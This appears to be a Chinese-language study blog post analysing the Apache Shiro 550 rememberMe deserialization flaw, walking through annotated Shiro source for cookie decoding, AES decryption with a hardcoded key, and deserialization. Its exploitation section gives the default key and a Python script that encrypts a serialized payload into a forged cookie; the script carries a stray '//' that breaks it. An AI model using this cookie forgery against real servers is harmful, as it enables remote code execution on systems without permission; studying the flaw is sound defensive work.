      <title>Shiro550流程分析</title>
      <link href="/2023/05/18/JavaSec/Shiro/Shiro550/images/index.html"/>
      <url>/2023/05/18/JavaSec/Shiro/Shiro550/images/index.html</url>
      
        <content type="html"><![CDATA[<p>Shiro550 分析</p><span id="more"></span><h1 id="shiro-550-流程分析"><a href="#Shiro-550-流程分析" class="headerlink" title="Shiro 550 流程分析"></a>Shiro 550 流程分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>今天跟随<a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">芜风师傅</a>学习 Shiro 550，不会记录太多。</li><li>关于 shiro 框架本身，参看本篇<a href="https://zhuanlan.zhihu.com/p/54176956">文章</a>。</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里芜风师傅没有细说耶，我简单记录一下。</p><ul><li>账号密码：admin admin</li><li>其余都是默认设置</li></ul><img src="/2023/05/18/JavaSec/Shiro/Shiro550/images/index/image-20230518111233394.png" class title="image-20230518111233394"><ul><li>后面要选择 JDK：</li></ul><img src="/2023/05/18/JavaSec/Shiro/Shiro550/images/index/image-20230518111544843.png" class title="image-20230518111544843"><ul><li>安装路径：</li></ul><img src="/2023/05/18/JavaSec/Shiro/Shiro550/images/index/image-20230518111555420.png" class title="image-20230518111555420"><blockquote><p>我真的服了，安装完 IDEA 识别不了文件夹。</p><p>后续发现是权限的问题，普通用户无法查看这个文件夹，我只好卸载了重装放到我的 D 盘。</p><p>后续发现和安装到什么盘符没关系，默认就是只有系统级别的用户才可以查看该文件夹。</p></blockquote><ul><li>修改安装文件夹权限：</li></ul><blockquote><p>可以通过 net user 命令查看用户名</p></blockquote><img src="/2023/05/18/JavaSec/Shiro/Shiro550/images/index/image-20230518112453054.png" class title="image-20230518112453054"><ul><li><p>后面发现即使我把主文件夹权限修改了，其下的子文件夹权限依旧不变，我查询了一下 windows 修改文件夹及其子文件夹权限的命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls <span class="hljs-string">&quot;./apache-tomcat-8.5.88&quot;</span> /grant mirror:F /T<br></code></pre></td></tr></table></figure><p>执行完这个命令终于可以在 IDEA 中检测到 tomcat8 了。</p><p>接下来是 Tomcat Server 的配置，这个的话我是直接右击 index.jsp 进行配置的。</p><img src="/2023/05/18/JavaSec/Shiro/Shiro550/images/index/image-20230518115436030.png" class title="image-20230518115436030"><p>选中更多运行/调试，然后修改运行配置，具体的配置参看芜风师傅（端口换成 8081）。</p></li></ul><img src="/2023/05/18/JavaSec/Shiro/Shiro550/images/index/image-20230518115517508.png" class title="image-20230518115517508"><img src="/2023/05/18/JavaSec/Shiro/Shiro550/images/index/image-20230518115704155.png" class title="image-20230518115704155"><p>然后利用 burp 抓包分析。</p><blockquote><p>ip 换成本机 WiFi 接口 IP</p></blockquote><ul><li>又遇见了奇怪的问题，点击 Remember me 之后发现登录不了。后面发现是只要我成功登录一次，后面就登录不上去。于是我重启了一遍服务器，然后直接抓包，这一次我抓到了 Remember me 相关字段。</li></ul><img src="/2023/05/18/JavaSec/Shiro/Shiro550/images/index/image-20230518132352226.png" class title="image-20230518132352226"><p>这个分析有点抽象呀，不知道咋找到的 shiro 相关模块。</p><ul><li><del>我先停止下来看看 shiro 是什么吧。</del></li></ul><h2 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h2><h3 id="getrememberedserializedidentity"><a href="#getRememberedSerializedIdentity" class="headerlink" title="getRememberedSerializedIdentity()"></a>getRememberedSerializedIdentity()</h3><p>总之，最后是找到 CookieRememberMeManager.java 文件里的 <code>getRememberedSerializedIdentity</code> 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">D:\web_security\CodeQL\apache-maven-<span class="hljs-number">3.9</span><span class="hljs-number">.1</span>\repo\org\apache\shiro\shiro-web\<span class="hljs-number">1.2</span><span class="hljs-number">.4</span>\shiro-web-<span class="hljs-number">1.2</span><span class="hljs-number">.4</span>-sources.jar!\org\apache\shiro\web\mgt\CookieRememberMeManager.java<br></code></pre></td></tr></table></figure><p>源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns a previously serialized identity byte array or &#123;<span class="hljs-doctag">@code</span> null&#125; if the byte array could not be acquired. 返回一个序列化后的身份字节数组。</span><br><span class="hljs-comment">     </span><br><span class="hljs-comment">     * This implementation retrieves an HTTP cookie, Base64-decodes the cookie value, and returns the resulting byte  array.  该实现会检索出 HTTP 请求中的 cookie 字段并将其进行 Base64解码然后返回结果字节数组。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     * The &#123;<span class="hljs-doctag">@code</span> SubjectContext&#125; instance is expected to be a &#123;<span class="hljs-doctag">@link</span> WebSubjectContext&#125; instance with an HTTP Request/Response pair so an HTTP cookie can be retrieved from the incoming request.  If it is not a &#123;<span class="hljs-doctag">@code</span> WebSubjectContext&#125; or that &#123;<span class="hljs-doctag">@code</span> WebSubjectContext&#125; does not have an HTTP Request/Response pair, this implementation returns &#123;<span class="hljs-doctag">@code</span> null&#125;.</span><br><span class="hljs-comment">     参数 SubjectContext 实例被期望是一个带有 HTTP 请求或响应对的 WebSubjectContext 对象，这样 HTTP cookie 就可以从即将到来的请求中检索出来。</span><br><span class="hljs-comment">     </span><br><span class="hljs-comment">     如果 SubjectContext 不是一个 WebSubjectContext 或 WebSubjectContext 没有一个 HTTP 请求/响应对，那么该实现返回 null。</span><br><span class="hljs-comment">     </span><br><span class="hljs-comment">     这个 WebSubjectContext 是什么？</span><br><span class="hljs-comment">     答：WebSubjectContext 本身是一个接口，继承了 SubjectContext，所以 WebSubjectContext 也是一个 SubjectContext。但是 WebSubjectContext 额外提供了方法来设置和检索 ServletRequest 和 ServletResponse。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> subjectContext the contextual data, usually provided by a &#123;<span class="hljs-doctag">@link</span> Subject.Builder&#125; implementation, that is being used to construct a &#123;<span class="hljs-doctag">@link</span> Subject&#125; instance.  To be used to assist with data lookup.</span><br><span class="hljs-comment">     参数 subjectContext：代表着上下文数据，通常由一个 Subject.Builder 实现，Subject.Builder 被用于构造一个 Subject 实例对象。</span><br><span class="hljs-comment">     </span><br><span class="hljs-comment">     </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> a previously serialized identity byte array or &#123;<span class="hljs-doctag">@code</span> null&#125; if the byte array could not be acquired.</span><br><span class="hljs-comment">     返回值：返回一个之前序列化后的身份字节数组</span><br><span class="hljs-comment">     </span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;<br><br>        <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123; <span class="hljs-comment">// 判断是否为 HTTP 请求</span><br>            <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +<br>                        <span class="hljs-string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +<br>                        <span class="hljs-string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;<br>                log.debug(msg);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <br>        &#125;<br><br>        <span class="hljs-type">WebSubjectContext</span> <span class="hljs-variable">wsc</span> <span class="hljs-operator">=</span> (WebSubjectContext) subjectContext;<br>        <span class="hljs-keyword">if</span> (isIdentityRemoved(wsc)) &#123; <span class="hljs-comment">// isIdentityRemoved 方法拿到当前请求的 IDENTITY_REMOVED_KEY 的值，如果这个值有定义则返回真。</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> WebUtils.getHttpRequest(wsc); <span class="hljs-comment">//拿到 http 请求</span><br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> WebUtils.getHttpResponse(wsc); <span class="hljs-comment">// 拿到 http 响应</span><br> <br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> getCookie().readValue(request, response); <span class="hljs-comment">// getCookie 返回当前请求的 cookie，之后 readValue 得到 cookie 的值（rememberMe）</span><br>    <br>        <span class="hljs-comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span><br>        <span class="hljs-comment">// ignore cookies that are scheduled for removal</span><br>        <span class="hljs-keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 如果 拿到的 cookie 值等于 deleteMe 返回空</span><br><br>        <span class="hljs-keyword">if</span> (base64 != <span class="hljs-literal">null</span>) &#123;<br>            base64 = ensurePadding(base64); <span class="hljs-comment">// 如果 cookie 中 rememberMe 的值长度不是 4 的倍数，那么进行填充，对于 base64 则是填充等于号。</span><br>            <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>                log.trace(<span class="hljs-string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="hljs-string">&quot;]&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">byte</span>[] decoded = Base64.decode(base64); <span class="hljs-comment">// base64 解码</span><br>            <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>                log.trace(<span class="hljs-string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="hljs-literal">null</span> ? decoded.length : <span class="hljs-number">0</span>) + <span class="hljs-string">&quot; bytes.&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> decoded;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//no cookie set - new site visitor?</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个方法被 getRememberedPrincipals() 调用。下面看看其源码</p><h3 id="getrememberedprincipals"><a href="#getRememberedPrincipals" class="headerlink" title="getRememberedPrincipals()"></a>getRememberedPrincipals()</h3><ul><li>这个方法名直译过来是得到记住的主体或是身份的意思</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Implements the interface method by first &#123;<span class="hljs-doctag">@link</span> #getRememberedSerializedIdentity(SubjectContext) acquiring&#125; the remembered serialized byte array.  </span><br><span class="hljs-comment">     </span><br><span class="hljs-comment">     Then it &#123;<span class="hljs-doctag">@link</span> #convertBytesToPrincipals(byte[], SubjectContext) converts them and returns the re-constituted &#123;<span class="hljs-doctag">@link</span> PrincipalCollection&#125;.  If no remembered principals could be obtained, &#123;<span class="hljs-doctag">@code</span> null&#125; is returned.</span><br><span class="hljs-comment">     </span><br><span class="hljs-comment">     getRememberedPrincipals() 方法首先通过 getRememberedSerializedIdentity() 方法获得序列化后的字节数组， </span><br><span class="hljs-comment">     然后调用 convertBytesToPrincipals() 方法将字节数组进行转换并返回重构后的 PrincipalCollection。如果不能得到记住后的 principals，该方法返回空。</span><br><span class="hljs-comment">     </span><br><span class="hljs-comment">     </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     * If any exceptions are thrown, the &#123;<span class="hljs-doctag">@link</span> #onRememberedPrincipalFailure(RuntimeException, SubjectContext)&#125; method</span><br><span class="hljs-comment">     * is called to allow any necessary post-processing (such as immediately removing any previously remembered</span><br><span class="hljs-comment">     * values for safety).</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> subjectContext the contextual data, usually provided by a &#123;<span class="hljs-doctag">@link</span> Subject.Builder&#125; implementation, that is being used to construct a &#123;<span class="hljs-doctag">@link</span> Subject&#125; instance.</span><br><span class="hljs-comment">     </span><br><span class="hljs-comment">     参数 subjectContext：代表着上下文数据，通常由一个 Subject.Builder 实现，Subject.Builder 被用于构造一个 Subject 实例对象。</span><br><span class="hljs-comment">     </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the remembered principals or &#123;<span class="hljs-doctag">@code</span> null&#125; if none could be acquired.</span><br><span class="hljs-comment">     返回值：返回记住的 principals 或空</span><br><span class="hljs-comment">     */</span> <br><br><span class="hljs-keyword">public</span> PrincipalCollection <span class="hljs-title function_">getRememberedPrincipals</span><span class="hljs-params">(SubjectContext subjectContext)</span> &#123;<br>        <span class="hljs-type">PrincipalCollection</span> <span class="hljs-variable">principals</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);<br>            <span class="hljs-comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span><br>            <span class="hljs-keyword">if</span> (bytes != <span class="hljs-literal">null</span> &amp;&amp; bytes.length &gt; <span class="hljs-number">0</span>) &#123;<br>                principals = convertBytesToPrincipals(bytes, subjectContext);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException re) &#123;<br>            principals = onRememberedPrincipalFailure(re, subjectContext);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> principals;<br>    &#125;<br></code></pre></td></tr></table></figure><p>关键点在于 convertBytesToPrincipals 方法，这个方法用来把字节数组转换成主体。</p><h3 id="convertbytestoprincipals"><a href="#convertBytesToPrincipals" class="headerlink" title="convertBytesToPrincipals()"></a>convertBytesToPrincipals()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * If a &#123;<span class="hljs-doctag">@link</span> #getCipherService() cipherService&#125; is available, it will be used to first decrypt the byte array. Then the bytes are then &#123;<span class="hljs-doctag">@link</span> #deserialize(byte[]) deserialized&#125; and then returned.</span><br><span class="hljs-comment">    若 getCipherService() 方法可用，那么其会首先被用于解密传入的字节数组，然后会对解密后的字节数组进行反序列化并返回。</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> bytes          the bytes to decrypt if necessary and then deserialize.</span><br><span class="hljs-comment">    参数 bytes：要解密的字节，若有必要还会进行反序列化。</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> subjectContext the contextual data, usually provided by a &#123;<span class="hljs-doctag">@link</span> Subject.Builder&#125; implementation, that is being used to construct a &#123;<span class="hljs-doctag">@link</span> Subject&#125; instance.</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">   参数 subjectContext：代表着上下文数据，通常由一个 Subject.Builder 实现。Subject.Builder 被用于构造一个 Subject 实例对象。</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    * <span class="hljs-doctag">@return</span> the de-serialized and possibly decrypted principals</span><br><span class="hljs-comment">    返回值：反序列化后解密完的 principals</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title function_">convertBytesToPrincipals</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;<br>       <span class="hljs-keyword">if</span> (getCipherService() != <span class="hljs-literal">null</span>) &#123;<br>           bytes = decrypt(bytes);<br>       &#125;<br>       <span class="hljs-keyword">return</span> deserialize(bytes);<br>   &#125;<br></code></pre></td></tr></table></figure><p>现在去看看是如何解密的</p><h3 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt()"></a>decrypt()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Decrypts the byte array using the configured &#123;<span class="hljs-doctag">@link</span> #getCipherService() cipherService&#125;.</span><br><span class="hljs-comment"> decrypt() 方法使用已配置好的 cipherService 解密传入的字节数组。在 Shiro550 中采用的密码服务是 AES</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> encrypted the encrypted byte array to decrypt</span><br><span class="hljs-comment"> 参数 encrypted：待解密的已加密的字节数组</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> the decrypted byte array returned by the configured &#123;<span class="hljs-doctag">@link</span> #getCipherService () cipher&#125;.</span><br><span class="hljs-comment"> 返回值：解密后的字节数组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] decrypt(<span class="hljs-type">byte</span>[] encrypted) &#123;<br>    <span class="hljs-type">byte</span>[] serialized = encrypted;<br>    <span class="hljs-type">CipherService</span> <span class="hljs-variable">cipherService</span> <span class="hljs-operator">=</span> getCipherService();<br>    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">byteSource</span> <span class="hljs-operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());<br>        serialized = byteSource.getBytes();<br>    &#125;<br>    <span class="hljs-keyword">return</span> serialized;<br>&#125;<br></code></pre></td></tr></table></figure><p>用来解密的密钥是一个固定的常量，解密完毕之后直接返回到 convertBytesToPrincipals() 方法，现在我们看 deserialize() 方法。</p><h3 id="deserialize"><a href="#deserialize" class="headerlink" title="deserialize()"></a>deserialize()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * De-serializes the given byte array by using the &#123;<span class="hljs-doctag">@link</span> #getSerializer() serializer&#125;&#x27;s</span><br><span class="hljs-comment"> * &#123;<span class="hljs-doctag">@link</span> Serializer#deserialize deserialize&#125; method.</span><br><span class="hljs-comment"> 使用序列化器的方法反序列化给定的字节数组。具体咋反序列化不用过于关心。</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> serializedIdentity the previously serialized &#123;<span class="hljs-doctag">@code</span> PrincipalCollection&#125; as a byte array</span><br><span class="hljs-comment"> 参数 serializedIdentity：之前序列化的字节数组</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> the de-serialized (reconstituted) &#123;<span class="hljs-doctag">@code</span> PrincipalCollection&#125;</span><br><span class="hljs-comment"> 返回值：反序列化后的 PrincipalCollection。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] serializedIdentity)</span> &#123;<br>    <span class="hljs-keyword">return</span> getSerializer().deserialize(serializedIdentity);<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里的话，Shiro 针对 cookie 中 rememberMe 字段值如何操作我们已经很清楚了：</p><ol><li>对 rememberMe 进行 base64 解码，如果解码结果不为 deleteMe 进入第二步</li><li>调用 AES 算法对 rememberMe 进行解密，加密的密钥硬编码在源码中。</li><li>将解密结果反序列化返回。</li></ol><h3 id="函数调用关系图"><a href="#函数调用关系图" class="headerlink" title="函数调用关系图"></a>函数调用关系图</h3><h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><ul><li>一直给我 remember 直接登录进去了，暂时先不分析这个。</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>思路很简单，因为我们知道这个解密过程会有一个反序列化嘛，所以可以利用之前学习过的一些 CC链、URLDNS 啥的进行反序列化攻击。</p><p>基本操作就是将 payload 进行 AES 加密然后 base64 编码然后放入到 rememberMe 字段中即可。</p><p>那么 exp 的编写就涉及到三个问题：</p><ol><li>AES 加密</li><li>base64 编码</li><li>本身的 payload 编写</li></ol><p>前两个问题可以利用 python 的第三方库轻松解决，最后一个需要借助前面学习的知识。</p><ul><li>exp 的编写的话其实芜风师傅有个点没有说到的，就是加解密过程中采用的工作模式是什么，Shiro550 默认是 CBC 模式。</li><li>CBC 模式需要一个初始向量，rememberMe base64编码前的前十六个字节用作 iv，这一点我还没有看源码。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># －*-* coding:utf-8</span><br><span class="hljs-comment"># @Time    :  2022/7/13 17:36</span><br><span class="hljs-comment"># @Author  : Drunkbaby</span><br><span class="hljs-comment"># @FileName: poc.py</span><br><span class="hljs-comment"># @Software: VSCode</span><br><span class="hljs-comment"># @Blog    ：https://drun1baby.github.io/</span><br><br><span class="hljs-keyword">from</span> email.mime <span class="hljs-keyword">import</span> base<br><span class="hljs-keyword">from</span> pydoc <span class="hljs-keyword">import</span> plain<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> turtle <span class="hljs-keyword">import</span> mode<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br> <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br> data = f.read()<br> <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br> BS = AES.block_size<br> pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.MODE_CBC<br> iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br> <span class="hljs-keyword">return</span> ciphertext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br> enc_data = base64.b64decode(enc_data)<br> unpad = <span class="hljs-keyword">lambda</span> s: s[:-s[-<span class="hljs-number">1</span>]]<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.MODE_CBC<br> iv = enc_data[:<span class="hljs-number">16</span>] // <br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br> plaintext = unpad(plaintext)<br> <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br> data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br> <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure>]]></content>
      
      
